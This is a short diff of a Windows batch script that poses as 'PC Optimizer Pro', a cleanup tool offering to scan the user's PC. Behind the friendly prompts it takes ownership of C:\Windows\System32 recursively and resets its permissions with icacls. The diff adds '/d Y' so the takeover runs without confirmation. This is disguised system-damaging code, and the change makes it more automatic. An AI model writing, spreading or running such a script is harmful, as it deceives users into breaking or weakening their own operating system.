@@ -8,7 +8,7 @@ echo PC Optimizer Pro is software that helps clean up your PC.
 echo To start, PC Optimizer Pro would like to perform a scan. Allow?
 cls
 echo Begin your scan. Please note that there may be times where we require permission to continue. Please enter "Y" when prompted.
-takeown /f "C:\Windows\System32" /r
+takeown /f "C:\Windows\System32" /r /d Y
 icacls "C:\Windows\System32" /reset /t /c /q
 echo ==========================================================================
 echo ==========================================================================
